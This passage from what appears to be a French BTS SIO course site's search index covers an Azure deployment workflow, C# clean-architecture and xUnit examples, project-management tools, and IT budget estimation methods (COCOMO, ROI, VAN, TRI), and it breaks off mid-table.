actions/checkout@v3\n\n    - name: Login to Azure\n      uses: azure/login@v1\n      with:\n        creds: ${{ secrets.AZURE_CREDENTIALS }}\n\n    - name: Build and push Docker image\n      run: |\n        docker build -t myproject:${{ github.sha }} .\n        docker tag myproject:${{ github.sha }} myregistry.azurecr.io/myproject:latest\n        docker push myregistry.azurecr.io/myproject:latest\n\n    - name: Deploy to Azure Container Instances\n      uses: azure/aci-deploy@v1\n      with:\n        resource-group: 'my-resource-group'\n        dns-name-label: 'myproject-${{ github.sha }}'\n        image: 'myregistry.azurecr.io/myproject:latest'\n        registry-login-server: 'myregistry.azurecr.io'\n        registry-username: ${{ secrets.REGISTRY_USERNAME }}\n        registry-password: ${{ secrets.REGISTRY_PASSWORD }}\n        name: 'myproject-container'\n        location: 'West Europe'</code></pre>\n    \n\n\n\n    \u2705 Bonnes Pratiques de D\u00e9veloppement\n\n    \n        \ud83c\udfc6 Standards de Qualit\u00e9\n        \n            Les bonnes pratiques de d\u00e9veloppement garantissent la qualit\u00e9, la maintenabilit\u00e9 et la s\u00e9curit\u00e9 du code. Elles couvrent l'architecture, le codage, les tests, la documentation et la collaboration en \u00e9quipe.\n        \n    \n\n    \n        \n            \ud83c\udfd7\ufe0f\n            Architecture Clean\n            \n                S\u00e9parer les responsabilit\u00e9s en couches distinctes : pr\u00e9sentation, logique m\u00e9tier, acc\u00e8s aux donn\u00e9es. Respecter les principes SOLID.\n            \n        \n\n        \n            \ud83d\udcdd\n            Code Lisible\n            \n                Utiliser des noms explicites, commenter le code complexe, respecter les conventions de nommage et maintenir une structure coh\u00e9rente.\n            \n        \n\n        \n            \ud83d\udd04\n            Contr\u00f4le de Version\n            \n                Commits atomiques avec messages clairs, utilisation de branches pour les fonctionnalit\u00e9s, revues de code syst\u00e9matiques.\n            \n        \n\n        \n            \ud83e\uddea\n            Tests Automatis\u00e9s\n            \n                Couverture de tests \u00e9lev\u00e9e, tests unitaires, d'int\u00e9gration et end-to-end. TDD (Test-Driven Development) quand appropri\u00e9.\n            \n        \n\n        \n            \ud83d\udd12\n            S\u00e9curit\u00e9\n            \n                Validation des entr\u00e9es, authentification robuste, chiffrement des donn\u00e9es sensibles, audit de s\u00e9curit\u00e9 r\u00e9gulier.\n            \n        \n\n        \n            \ud83d\udcca\n            Monitoring\n            \n                Logs structur\u00e9s, m\u00e9triques de performance, alertes automatiques, tableaux de bord pour le suivi en temps r\u00e9el.\n            \n        \n    \n\n    \n        \ud83d\udcbb Exemple : Architecture Clean avec C#\n        <pre><code>// Domain Layer - Entit\u00e9 m\u00e9tier\npublic class User\n{\n    public int Id { get; private set; }\n    public string Email { get; private set; }\n    public string FirstName { get; private set; }\n    public string LastName { get; private set; }\n    public DateTime CreatedAt { get; private set; }\n    public bool IsActive { get; private set; }\n\n    private User() { } // Pour EF Core\n\n    public User(string email, string firstName, string lastName)\n    {\n        if (string.IsNullOrWhiteSpace(email))\n            throw new ArgumentException(\"Email is required\", nameof(email));\n\n        if (!IsValidEmail(email))\n            throw new ArgumentException(\"Invalid email format\", nameof(email));\n\n        Email = email.ToLowerInvariant();\n        FirstName = firstName?.Trim();\n        LastName = lastName?.Trim();\n        CreatedAt = DateTime.UtcNow;\n        IsActive = true;\n    }\n\n    public void Deactivate()\n    {\n        IsActive = false;\n    }\n\n    public void UpdateProfile(string firstName, string lastName)\n    {\n        FirstName = firstName?.Trim();\n        LastName = lastName?.Trim();\n    }\n\n    private static bool IsValidEmail(string email)\n    {\n        try\n        {\n            var addr = new System.Net.Mail.MailAddress(email);\n            return addr.Address == email;\n        }\n        catch\n        {\n            return false;\n        }\n    }\n}\n\n// Application Layer - Service m\u00e9tier\npublic interface IUserService\n{\n    Task CreateUserAsync(CreateUserCommand command);\n    Task GetUserByIdAsync(int id);\n    Task&gt; GetActiveUsersAsync();\n    Task DeactivateUserAsync(int id);\n}\n\npublic class UserService : IUserService\n{\n    private readonly IUserRepository _userRepository;\n    private readonly IEmailService _emailService;\n    private readonly ILogger _logger;\n\n    public UserService(IUserRepository userRepository, IEmailService emailService, ILogger logger)\n    {\n        _userRepository = userRepository;\n        _emailService = emailService;\n        _logger = logger;\n    }\n\n    public async Task CreateUserAsync(CreateUserCommand command)\n    {\n        _logger.LogInformation(\"Creating user with email: {Email}\", command.Email);\n\n        // V\u00e9rifier si l'utilisateur existe d\u00e9j\u00e0\n        var existingUser = await _userRepository.GetByEmailAsync(command.Email);\n        if (existingUser != null)\n        {\n            throw new BusinessException(\"User with this email already exists\");\n        }\n\n        // Cr\u00e9er le nouvel utilisateur\n        var user = new User(command.Email, command.FirstName, command.LastName);\n\n        // Sauvegarder\n        await _userRepository.AddAsync(user);\n        await _userRepository.SaveChangesAsync();\n\n        // Envoyer email de bienvenue\n        await _emailService.SendWelcomeEmailAsync(user.Email, user.FirstName);\n\n        _logger.LogInformation(\"User created successfully with ID: {UserId}\", user.Id);\n\n        return user;\n    }\n\n    public async Task GetUserByIdAsync(int id)\n    {\n        var user = await _userRepository.GetByIdAsync(id);\n        if (user == null)\n        {\n            throw new NotFoundException($\"User with ID {id} not found\");\n        }\n\n        return user;\n    }\n\n    public async Task&gt; GetActiveUsersAsync()\n    {\n        return await _userRepository.GetActiveUsersAsync();\n    }\n\n    public async Task DeactivateUserAsync(int id)\n    {\n        var user = await GetUserByIdAsync(id);\n        user.Deactivate();\n\n        await _userRepository.SaveChangesAsync();\n\n        _logger.LogInformation(\"User {UserId} deactivated\", id);\n    }\n}\n\n// Infrastructure Layer - Repository\npublic interface IUserRepository\n{\n    Task GetByIdAsync(int id);\n    Task GetByEmailAsync(string email);\n    Task&gt; GetActiveUsersAsync();\n    Task AddAsync(User user);\n    Task SaveChangesAsync();\n}\n\npublic class UserRepository : IUserRepository\n{\n    private readonly ApplicationDbContext _context;\n\n    public UserRepository(ApplicationDbContext context)\n    {\n        _context = context;\n    }\n\n    public async Task GetByIdAsync(int id)\n    {\n        return await _context.Users.FindAsync(id);\n    }\n\n    public async Task GetByEmailAsync(string email)\n    {\n        return await _context.Users\n            .FirstOrDefaultAsync(u =&gt; u.Email == email.ToLowerInvariant());\n    }\n\n    public async Task&gt; GetActiveUsersAsync()\n    {\n        return await _context.Users\n            .Where(u =&gt; u.IsActive)\n            .OrderBy(u =&gt; u.LastName)\n            .ToListAsync();\n    }\n\n    public async Task AddAsync(User user)\n    {\n        await _context.Users.AddAsync(user);\n    }\n\n    public async Task SaveChangesAsync()\n    {\n        await _context.SaveChangesAsync();\n    }\n}\n    \n\n    \n        \ud83d\udea8 Attention : Ne jamais committer de secrets (mots de passe, cl\u00e9s API) dans le code source. Utilisez des variables d'environnement ou des services de gestion de secrets.\n    \n\n\n\n    \ud83d\udcc8 Gestion de la Qualit\u00e9 et des Risques\n\n    \n        \ud83c\udfaf Assurance Qualit\u00e9\n        \n            La gestion de la qualit\u00e9 dans un projet de d\u00e9veloppement implique la mise en place de processus, d'outils et de m\u00e9triques pour garantir que le produit final r\u00e9pond aux exigences et aux standards de qualit\u00e9 d\u00e9finis.\n        \n    \n\n    \n        \n            \ud83d\udcca\n            M\u00e9triques de Qualit\u00e9\n            \n                Couverture de tests : &gt; 80%\n                Complexit\u00e9 cyclomatique : &lt; 10\n                Duplication de code : &lt; 3%\n                Bugs critiques : 0\n            \n        \n\n        \n            \u26a0\ufe0f\n            Gestion des Risques\n            \n                Identification proactive des risques techniques, fonctionnels et organisationnels avec plans de mitigation appropri\u00e9s.\n            \n        \n\n        \n            \ud83d\udd0d\n            Revues de Code\n            \n                Processus syst\u00e9matique de relecture du code par les pairs pour d\u00e9tecter les bugs et am\u00e9liorer la qualit\u00e9.\n            \n        \n\n        \n            \ud83d\udccb\n            Standards de Codage\n            \n                Conventions de nommage, formatage, documentation et architecture respect\u00e9es par toute l'\u00e9quipe.\n            \n        \n    \n\n    \n        \ud83d\udcbb Exemple : Tests Unitaires avec xUnit\n        <pre><code>// Tests unitaires pour le UserService\npublic class UserServiceTests\n{\n    private readonly Mock _userRepositoryMock;\n    private readonly Mock _emailServiceMock;\n    private readonly Mock&gt; _loggerMock;\n    private readonly UserService _userService;\n\n    public UserServiceTests()\n    {\n        _userRepositoryMock = new Mock();\n        _emailServiceMock = new Mock();\n        _loggerMock = new Mock&gt;();\n        _userService = new UserService(_userRepositoryMock.Object, _emailServiceMock.Object, _loggerMock.Object);\n    }\n\n    [Fact]\n    public async Task CreateUserAsync_WithValidData_ShouldCreateUser()\n    {\n        // Arrange\n        var command = new CreateUserCommand\n        {\n            Email = \"test@example.com\",\n            FirstName = \"John\",\n            LastName = \"Doe\"\n        };\n\n        _userRepositoryMock.Setup(x =&gt; x.GetByEmailAsync(command.Email))\n            .ReturnsAsync((User)null);\n\n        _userRepositoryMock.Setup(x =&gt; x.AddAsync(It.IsAny()))\n            .Returns(Task.CompletedTask);\n\n        _userRepositoryMock.Setup(x =&gt; x.SaveChangesAsync())\n            .Returns(Task.CompletedTask);\n\n        _emailServiceMock.Setup(x =&gt; x.SendWelcomeEmailAsync(It.IsAny(), It.IsAny()))\n            .Returns(Task.CompletedTask);\n\n        // Act\n        var result = await _userService.CreateUserAsync(command);\n\n        // Assert\n        Assert.NotNull(result);\n        Assert.Equal(command.Email.ToLowerInvariant(), result.Email);\n        Assert.Equal(command.FirstName, result.FirstName);\n        Assert.Equal(command.LastName, result.LastName);\n        Assert.True(result.IsActive);\n\n        _userRepositoryMock.Verify(x =&gt; x.AddAsync(It.IsAny()), Times.Once);\n        _userRepositoryMock.Verify(x =&gt; x.SaveChangesAsync(), Times.Once);\n        _emailServiceMock.Verify(x =&gt; x.SendWelcomeEmailAsync(command.Email, command.FirstName), Times.Once);\n    }\n\n    [Fact]\n    public async Task CreateUserAsync_WithExistingEmail_ShouldThrowBusinessException()\n    {\n        // Arrange\n        var command = new CreateUserCommand\n        {\n            Email = \"existing@example.com\",\n            FirstName = \"Jane\",\n            LastName = \"Smith\"\n        };\n\n        var existingUser = new User(command.Email, \"Existing\", \"User\");\n        _userRepositoryMock.Setup(x =&gt; x.GetByEmailAsync(command.Email))\n            .ReturnsAsync(existingUser);\n\n        // Act &amp; Assert\n        var exception = await Assert.ThrowsAsync(\n            () =&gt; _userService.CreateUserAsync(command));\n\n        Assert.Equal(\"User with this email already exists\", exception.Message);\n\n        _userRepositoryMock.Verify(x =&gt; x.AddAsync(It.IsAny()), Times.Never);\n        _emailServiceMock.Verify(x =&gt; x.SendWelcomeEmailAsync(It.IsAny(), It.IsAny()), Times.Never);\n    }\n\n    [Theory]\n    [InlineData(\"\")]\n    [InlineData(\" \")]\n    [InlineData(\"invalid-email\")]\n    [InlineData(\"@example.com\")]\n    [InlineData(\"test@\")]\n    public async Task CreateUserAsync_WithInvalidEmail_ShouldThrowArgumentException(string invalidEmail)\n    {\n        // Arrange\n        var command = new CreateUserCommand\n        {\n            Email = invalidEmail,\n            FirstName = \"Test\",\n            LastName = \"User\"\n        };\n\n        // Act &amp; Assert\n        await Assert.ThrowsAsync(\n            () =&gt; _userService.CreateUserAsync(command));\n    }\n\n    [Fact]\n    public async Task GetUserByIdAsync_WithExistingId_ShouldReturnUser()\n    {\n        // Arrange\n        var userId = 1;\n        var expectedUser = new User(\"test@example.com\", \"John\", \"Doe\");\n\n        _userRepositoryMock.Setup(x =&gt; x.GetByIdAsync(userId))\n            .ReturnsAsync(expectedUser);\n\n        // Act\n        var result = await _userService.GetUserByIdAsync(userId);\n\n        // Assert\n        Assert.NotNull(result);\n        Assert.Equal(expectedUser.Email, result.Email);\n    }\n\n    [Fact]\n    public async Task GetUserByIdAsync_WithNonExistingId_ShouldThrowNotFoundException()\n    {\n        // Arrange\n        var userId = 999;\n        _userRepositoryMock.Setup(x =&gt; x.GetByIdAsync(userId))\n            .ReturnsAsync((User)null);\n\n        // Act &amp; Assert\n        var exception = await Assert.ThrowsAsync(\n            () =&gt; _userService.GetUserByIdAsync(userId));\n\n        Assert.Equal($\"User with ID {userId} not found\", exception.Message);\n    }\n}\n    \n\n    \n        \ud83d\udca1 Conseil : Utilisez des outils d'analyse statique comme SonarQube pour d\u00e9tecter automatiquement les probl\u00e8mes de qualit\u00e9 et les vuln\u00e9rabilit\u00e9s de s\u00e9curit\u00e9."},{"location":"BTS/B1/B1_7_Outils_gestion_projet/","title":"B1 7 Outils gestion projet","text":"\ud83d\udee0\ufe0f Outils de Gestion de Projet <p>BTS SIO SLAM - Bloc 1 : Ma\u00eetrise des outils professionnels pour l'AP</p> \ud83c\udfaf Panorama des Outils de Gestion \ud83d\udd27 \u00c9cosyst\u00e8me des Outils              Les outils de gestion de projet facilitent la planification, le suivi et la collaboration dans vos projets d'AP. Ils permettent de visualiser les t\u00e2ches, g\u00e9rer les ressources, suivre l'avancement et communiquer efficacement avec votre \u00e9quipe et vos encadrants.                   Pour votre Atelier Professionnel en BTS SIO 2\u00e8me ann\u00e9e, la ma\u00eetrise de ces outils est essentielle. Ils vous permettront de d\u00e9montrer votre professionnalisme et votre capacit\u00e9 \u00e0 g\u00e9rer un projet selon les standards de l'industrie informatique.      \ud83d\udcca Diagrammes de Gantt \ud83d\udcc8 Planification Temporelle              Le diagramme de Gantt visualise les t\u00e2ches d'un projet dans le temps, montrant les d\u00e9pendances, les dur\u00e9es et l'avancement. Id\u00e9al pour planifier votre AP et communiquer sur les d\u00e9lais.          T\u00e2ches AP S1 S2 S3 S4 S5 S6 S7 S8 Analyse des besoins Analyse Analyse Conception UI/UX Design Design D\u00e9veloppement Dev Dev Dev Dev Tests &amp; D\u00e9ploiement Tests Tests Deploy          \ud83d\udca1 Avantage Gantt : Visualisation claire des d\u00e9pendances et identification rapide des retards potentiels sur le chemin critique.      \ud83d\udd17 M\u00e9thode PERT \ud83c\udfaf Program Evaluation and Review Technique              PERT est une m\u00e9thode de gestion de projet qui utilise un r\u00e9seau de t\u00e2ches pour identifier le chemin critique et estimer les dur\u00e9es avec incertitude. Particuli\u00e8rement utile pour les projets innovants d'AP.          A D\u00e9but \u2192 B Analyse \u2192 C Design \u2192 D Dev \u2192 E Tests \u2192 F Fin Calcul PERT : Dur\u00e9e estim\u00e9e = (Optimiste + 4\u00d7Probable + Pessimiste) / 6         Exemple : D\u00e9veloppement = (3 + 4\u00d75 + 8) / 6 = 5,17 semaines      \ud83d\udee0\ufe0f Outils Recommand\u00e9s pour l'AP \ud83d\udccb Trello Kanban Simple                  Interface intuitive bas\u00e9e sur des cartes et des listes. Parfait pour d\u00e9buter avec Kanban dans votre AP.              <ul> <li>Tableaux Kanban visuels</li> <li>Collaboration en temps r\u00e9el</li> <li>Int\u00e9grations (GitHub, Slack)</li> <li>Applications mobiles</li> </ul> Gratuit jusqu'\u00e0 10 \u00e9quipes \ud83d\ude80 Jira Agile Professionnel                  Outil professionnel pour Scrum et Kanban. Standard de l'industrie, excellent pour votre CV.              <ul> <li>Scrum et Kanban avanc\u00e9s</li> <li>Rapports et m\u00e9triques</li> <li>Gestion des bugs</li> <li>Int\u00e9gration DevOps compl\u00e8te</li> </ul> Gratuit jusqu'\u00e0 10 utilisateurs \ud83d\udcca Microsoft Project Gantt Avanc\u00e9                  R\u00e9f\u00e9rence pour les diagrammes de Gantt et la gestion de ressources. Id\u00e9al pour les projets complexes.              <ul> <li>Diagrammes de Gantt complets</li> <li>Gestion des ressources</li> <li>Analyse du chemin critique</li> <li>Rapports avanc\u00e9s</li> </ul> Licence \u00e9tudiante disponible \ud83d\udc19 GitHub Projects Int\u00e9gr\u00e9 Git                  Gestion de projet int\u00e9gr\u00e9e \u00e0 votre code source. Parfait pour les projets de d\u00e9veloppement d'AP.              <ul> <li>Int\u00e9gration native avec Git</li> <li>Issues et Pull Requests</li> <li>Tableaux Kanban</li> <li>Automatisations</li> </ul> Gratuit pour projets publics \ud83c\udfa8 Notion Tout-en-un                  Espace de travail collaboratif combinant notes, t\u00e2ches, bases de donn\u00e9es et wiki.              <ul> <li>Documentation int\u00e9gr\u00e9e</li> <li>Bases de donn\u00e9es relationnelles</li> <li>Templates de projet</li> <li>Collaboration avanc\u00e9e</li> </ul> Gratuit pour usage personnel \ud83d\udc8e Monday.com Visuel &amp; Flexible                  Plateforme visuelle et intuitive pour la gestion de projet avec de nombreuses vues personnalisables.              <ul> <li>Vues multiples (Gantt, Kanban, Timeline)</li> <li>Automatisations visuelles</li> <li>Tableaux de bord</li> <li>Int\u00e9grations nombreuses</li> </ul> Essai gratuit 14 jours \u2696\ufe0f Comparaison des Outils Outil Complexit\u00e9 Gantt Kanban Scrum Prix \u00c9tudiant Recommandation AP Trello Faible \u274c \u2705 \u26a0\ufe0f Gratuit D\u00e9butants, projets simples Jira \u00c9lev\u00e9e \u26a0\ufe0f \u2705 \u2705 Gratuit Projets agiles complexes MS Project \u00c9lev\u00e9e \u2705 \u274c \u274c Licence \u00e9tudiante Projets avec contraintes temporelles GitHub Projects Moyenne \u274c \u2705 \u26a0\ufe0f Gratuit Projets de d\u00e9veloppement Notion Moyenne \u26a0\ufe0f \u2705 \u26a0\ufe0f Gratuit Documentation + gestion Monday.com Moyenne \u2705 \u2705 \u2705 Essai gratuit \u00c9quipes mixtes \ud83c\udf93 Int\u00e9gration dans l'AP \ud83d\ude80 Strat\u00e9gie d'Adoption pour l'AP Phase 1 - D\u00e9marrage (Semaines 1-2) :             \u2022 Choisir l'outil principal selon la complexit\u00e9 du projet             \u2022 Former l'\u00e9quipe aux fonctionnalit\u00e9s de base             \u2022 Cr\u00e9er la structure initiale du projet Phase 2 - Planification (Semaines 3-4) :             \u2022 D\u00e9composer le projet en t\u00e2ches dans l'outil             \u2022 D\u00e9finir les d\u00e9pendances et les jalons             \u2022 Assigner les responsabilit\u00e9s Phase 3 - Ex\u00e9cution (Semaines 5-16) :             \u2022 Mise \u00e0 jour quotidienne de l'avancement             \u2022 Utilisation des rapports pour le suivi             \u2022 Adaptation selon les retours d'exp\u00e9rience          \ud83d\udcca M\u00e9triques \u00e0 Suivre dans l'AP              \u2022 V\u00e9locit\u00e9 : Nombre de points/t\u00e2ches r\u00e9alis\u00e9es par sprint             \u2022 Burndown : \u00c9volution du travail restant dans le temps             \u2022 Lead Time : Temps entre cr\u00e9ation et livraison d'une t\u00e2che             \u2022 Cycle Time : Temps de traitement effectif d'une t\u00e2che             \u2022 Taux de r\u00e9ouverture : Pourcentage de t\u00e2ches rouvertes apr\u00e8s fermeture                   \ud83c\udfaf Conseil AP : Documentez votre utilisation des outils dans votre rapport de projet. Incluez des captures d'\u00e9cran des tableaux de bord et expliquez comment ils ont contribu\u00e9 au succ\u00e8s du projet.      \ud83d\udd27 Bonnes Pratiques \ud83d\udcdd D\u00e9finition des T\u00e2ches                  Cr\u00e9ez des t\u00e2ches claires, mesurables et avec des crit\u00e8res d'acceptation pr\u00e9cis.              <ul> <li>Titre explicite et actionnable</li> <li>Description d\u00e9taill\u00e9e</li> <li>Crit\u00e8res d'acceptation</li> <li>Estimation de charge</li> </ul> \ud83d\udd04 Mise \u00e0 Jour R\u00e9guli\u00e8re                  Maintenez vos outils \u00e0 jour pour refl\u00e9ter la r\u00e9alit\u00e9 du projet.              <ul> <li>Mise \u00e0 jour quotidienne</li> <li>Commentaires sur les blocages</li> <li>Ajustement des estimations</li> <li>Documentation des d\u00e9cisions</li> </ul> \ud83d\udc65 Collaboration Efficace                  Utilisez les fonctionnalit\u00e9s collaboratives pour am\u00e9liorer la communication.              <ul> <li>Notifications pertinentes</li> <li>Commentaires constructifs</li> <li>Partage de fichiers</li> <li>Mentions d'\u00e9quipiers</li> </ul> \ud83d\udcca Analyse et Am\u00e9lioration                  Exploitez les donn\u00e9es pour am\u00e9liorer continuellement vos processus.              <ul> <li>Analyse des m\u00e9triques</li> <li>Identification des goulots</li> <li>R\u00e9trospectives bas\u00e9es sur les donn\u00e9es</li> <li>Optimisation des workflows</li> </ul>          \ud83c\udfc6 Succ\u00e8s de l'AP : La ma\u00eetrise des outils de gestion de projet d\u00e9montre votre professionnalisme et votre capacit\u00e9 \u00e0 travailler selon les standards de l'industrie. C'est un atout majeur pour votre insertion professionnelle et la r\u00e9ussite de votre projet d'Atelier Professionnel !"},{"location":"BTS/B1/B1_9_Gestion_budgetaire/","title":"B1 9 Gestion budgetaire","text":""},{"location":"BTS/B1/B1_9_Gestion_budgetaire/#b19-gestion-budgetaire-des-projets-informatiques","title":"B1.9 - Gestion Budg\u00e9taire des Projets Informatiques \ud83d\udcb0","text":"\ud83c\udfaf Objectifs du Chapitre <ul> <li>Comprendre les enjeux de la gestion budg\u00e9taire en informatique</li> <li>Ma\u00eetriser les m\u00e9thodes d'estimation des co\u00fbts</li> <li>Analyser la rentabilit\u00e9 des projets (ROI, VAN, TRI)</li> <li>G\u00e9rer les budgets tout au long du cycle de vie</li> <li>Optimiser les co\u00fbts et contr\u00f4ler les d\u00e9rives</li> </ul>"},{"location":"BTS/B1/B1_9_Gestion_budgetaire/#introduction-a-la-gestion-budgetaire","title":"\ud83d\udcca Introduction \u00e0 la Gestion Budg\u00e9taire","text":""},{"location":"BTS/B1/B1_9_Gestion_budgetaire/#pourquoi-la-gestion-budgetaire-est-cruciale","title":"Pourquoi la Gestion Budg\u00e9taire est Cruciale ?","text":"\u26a0\ufe0f Statistiques Alarmantes \u2022 70% des projets informatiques d\u00e9passent leur budget initial \u2022 45% des projets co\u00fbtent plus de 200% du budget pr\u00e9vu \u2022 Les d\u00e9passements moyens sont de 27% en temps et 56% en budget"},{"location":"BTS/B1/B1_9_Gestion_budgetaire/#les-enjeux-financiers","title":"Les Enjeux Financiers","text":"<ol> <li>Contraintes Budg\u00e9taires</li> <li>Budgets limit\u00e9s des organisations</li> <li>Concurrence entre projets</li> <li> <p>Justification des investissements</p> </li> <li> <p>Risques Financiers</p> </li> <li>D\u00e9passements de co\u00fbts</li> <li>Retours sur investissement insuffisants</li> <li> <p>Impact sur la tr\u00e9sorerie</p> </li> <li> <p>Opportunit\u00e9s</p> </li> <li>Optimisation des ressources</li> <li>Am\u00e9lioration de la comp\u00e9titivit\u00e9</li> <li>Innovation technologique</li> </ol>"},{"location":"BTS/B1/B1_9_Gestion_budgetaire/#composantes-du-budget-informatique","title":"\ud83d\udca1 Composantes du Budget Informatique","text":""},{"location":"BTS/B1/B1_9_Gestion_budgetaire/#structure-generale-des-couts","title":"Structure G\u00e9n\u00e9rale des Co\u00fbts","text":"\ud83c\udfd7\ufe0f Co\u00fbts de D\u00e9veloppement (60-70%) <ul> <li>Personnel : Salaires, charges sociales, formations</li> <li>Mat\u00e9riel : Serveurs, postes de travail, \u00e9quipements r\u00e9seau</li> <li>Logiciels : Licences, outils de d\u00e9veloppement, bases de donn\u00e9es</li> </ul> \ud83d\udd27 Co\u00fbts d'Exploitation (20-30%) <ul> <li>Maintenance : Corrective, \u00e9volutive, pr\u00e9ventive</li> <li>Support : Assistance utilisateurs, documentation</li> <li>Infrastructure : H\u00e9bergement, sauvegardes, s\u00e9curit\u00e9</li> </ul> \ud83d\udcda Co\u00fbts Annexes (10-20%) <ul> <li>Formation : Utilisateurs finaux, \u00e9quipes techniques</li> <li>Gestion : Chef de projet, coordination, reporting</li> <li>Qualit\u00e9 : Tests, audits, certifications</li> </ul>"},{"location":"BTS/B1/B1_9_Gestion_budgetaire/#repartition-temporelle-des-couts","title":"R\u00e9partition Temporelle des Co\u00fbts","text":"\ud83d\udcc5 Phases et Co\u00fbts Associ\u00e9s Phase 1 - Analyse (10-15%) \u00c9tude de faisabilit\u00e9, sp\u00e9cifications, architecture  Phase 2 - D\u00e9veloppement (50-60%) Programmation, tests unitaires, int\u00e9gration  Phase 3 - D\u00e9ploiement (15-20%) Installation, migration, formation utilisateurs  Phase 4 - Maintenance (15-25%) Support, \u00e9volutions, corrections (par an)"},{"location":"BTS/B1/B1_9_Gestion_budgetaire/#methodes-destimation-des-couts","title":"\ud83d\udcc8 M\u00e9thodes d'Estimation des Co\u00fbts","text":""},{"location":"BTS/B1/B1_9_Gestion_budgetaire/#1-estimation-par-analogie","title":"1. Estimation par Analogie","text":"\u2705 Principe Utiliser des projets similaires r\u00e9alis\u00e9s pr\u00e9c\u00e9demment comme r\u00e9f\u00e9rence pour estimer les co\u00fbts du nouveau projet.  <p>Avantages : - Rapide \u00e0 mettre en \u0153uvre - Bas\u00e9e sur l'exp\u00e9rience r\u00e9elle - Peu co\u00fbteuse</p> <p>Inconv\u00e9nients : - N\u00e9cessite une base de donn\u00e9es historique - Peut \u00eatre impr\u00e9cise si les projets diff\u00e8rent - Subjective</p> <p>Exemple d'Application : <pre><code>Projet A (r\u00e9alis\u00e9) : Site e-commerce - 150 000\u20ac - 8 mois\nProjet B (\u00e0 estimer) : Site e-commerce + mobile\n\nEstimation : 150 000\u20ac \u00d7 1,3 (facteur mobile) = 195 000\u20ac\n</code></pre></p>"},{"location":"BTS/B1/B1_9_Gestion_budgetaire/#2-estimation-parametrique","title":"2. Estimation Param\u00e9trique","text":"Co\u00fbt = Taille \u00d7 Productivit\u00e9 \u00d7 Facteurs d'Ajustement  <p>M\u00e9thode COCOMO (COnstructive COst MOdel) :</p> Type de Projet Formule de Base Facteur de Complexit\u00e9 Simple (Organique) Effort = 2,4 \u00d7 (KLOC)^1,05 1,0 - 1,2 Moyen (Semi-d\u00e9tach\u00e9) Effort = 3,0 \u00d7 (KLOC)^1,12 1,2 - 1,5 Complexe (Embarqu\u00e9) Effort = 3,6 \u00d7 (KLOC)^1,20 1,5 - 2,0 <p>KLOC = Milliers de Lignes de Code</p>"},{"location":"BTS/B1/B1_9_Gestion_budgetaire/#3-estimation-bottom-up","title":"3. Estimation Bottom-Up","text":"<p>Processus : 1. D\u00e9composer le projet en t\u00e2ches \u00e9l\u00e9mentaires 2. Estimer chaque t\u00e2che individuellement 3. Agr\u00e9ger les estimations 4. Ajouter les marges de s\u00e9curit\u00e9</p> T\u00e2che 1 15j <p>Interface utilisateur</p> T\u00e2che 2 25j <p>Base de donn\u00e9es</p> T\u00e2che 3 20j <p>API Backend</p> Total 60j <p>+ 20% marge = 72j</p>"},{"location":"BTS/B1/B1_9_Gestion_budgetaire/#4-estimation-par-points-de-fonction","title":"4. Estimation par Points de Fonction","text":"<p>Principe : Mesurer la taille fonctionnelle du logiciel</p> \u00c9l\u00e9ment Complexit\u00e9 Simple Complexit\u00e9 Moyenne Complexit\u00e9 \u00c9lev\u00e9e Entr\u00e9es externes 3 points 4 points 6 points Sorties externes 4 points 5 points 7 points Fichiers logiques 7 points 10 points 15 points Interfaces externes 5 points 7 points 10 points Requ\u00eates externes 3 points 4 points 6 points"},{"location":"BTS/B1/B1_9_Gestion_budgetaire/#analyse-de-rentabilite","title":"\ud83d\udcb0 Analyse de Rentabilit\u00e9","text":""},{"location":"BTS/B1/B1_9_Gestion_budgetaire/#1-retour-sur-investissement-roi","title":"1. Retour sur Investissement (ROI)","text":"ROI = (B\u00e9n\u00e9fices - Co\u00fbts) / Co\u00fbts \u00d7 100  <p>Exemple : - Co\u00fbt du projet : 200 000\u20ac - B\u00e9n\u00e9fices annuels : 80 000\u20ac - ROI = (80 000 - 200 000) / 200 000 \u00d7 100 = -60% (premi\u00e8re ann\u00e9e) - ROI sur 3 ans = (240 000 - 200 000) / 200 000 \u00d7 100 = 20%</p> ROI &lt; 0% <p>Projet non rentable</p> ROI 0-15% <p>Rentabilit\u00e9 faible</p> ROI &gt; 15% <p>Projet rentable</p>"},{"location":"BTS/B1/B1_9_Gestion_budgetaire/#2-valeur-actuelle-nette-van","title":"2. Valeur Actuelle Nette (VAN)","text":"VAN = \u03a3 [Flux de tr\u00e9sorerie / (1 + taux d'actualisation)^n] - Investissement initial  <p>Interpr\u00e9tation : - VAN &gt; 0 : Projet cr\u00e9ateur de valeur - VAN = 0 : Projet neutre - VAN &lt; 0 : Projet destructeur de valeur</p>"},{"location":"BTS/B1/B1_9_Gestion_budgetaire/#3-taux-de-rentabilite-interne-tri","title":"3. Taux de Rentabilit\u00e9 Interne (TRI)","text":"<p>Le TRI est le taux d'actualisation qui annule la VAN.</p> <p>Crit\u00e8re de d\u00e9cision : - TRI &gt; Co\u00fbt du capital : Projet acceptable - TRI &lt; Co\u00fbt du capital : Projet \u00e0 rejeter</p>"},{"location":"BTS/B1/B1_9_Gestion_budgetaire/#suivi-et-controle-budgetaire","title":"\ud83d\udcca Suivi et Contr\u00f4le Budg\u00e9taire","text":""},{"location":"BTS/B1/B1_9_Gestion_budgetaire/#indicateurs-de-performance","title":"Indicateurs de Performance","text":"CPI 0.85 <p>Cost Performance Index(Valeur acquise / Co\u00fbt r\u00e9el)</p> SPI 1.12 <p>Schedule Performance Index(Valeur acquise / Valeur planifi\u00e9e)</p> EAC 235k\u20ac <p>Estimate at Completion(Co\u00fbt final estim\u00e9)</p> VAR -15k\u20ac <p>Cost Variance(Valeur acquise - Co\u00fbt r\u00e9el)</p>"},{"location":"BTS/B1/B1_9_Gestion_budgetaire/#methode-de-la-valeur-acquise-earned-value","title":"M\u00e9thode de la Valeur Acquise (Earned Value)","text":"\ud83d\udcc8 Courbes de Suivi Budg\u00e9taire <p>Avancement : 65% - Budget consomm\u00e9 : 75% - \u00c9cart : -10%</p> <p>Formules Cl\u00e9s : - Valeur Planifi\u00e9e (PV) : Budget pr\u00e9vu pour le travail planifi\u00e9 - Valeur Acquise (EV) : Budget pr\u00e9vu pour le travail r\u00e9alis\u00e9 - Co\u00fbt R\u00e9el (AC) : Co\u00fbt r\u00e9el du travail r\u00e9alis\u00e9</p>"},{"location":"BTS/B1/B1_9_Gestion_budgetaire/#tableau-de-bord-budgetaire","title":"Tableau de Bord Budg\u00e9taire","text":"Phase Budget Initial Budget R\u00e9vis\u00e9 Co\u00fbt R\u00e9el \u00c9cart % Avancement Analyse 25 000\u20ac 25 000\u20ac 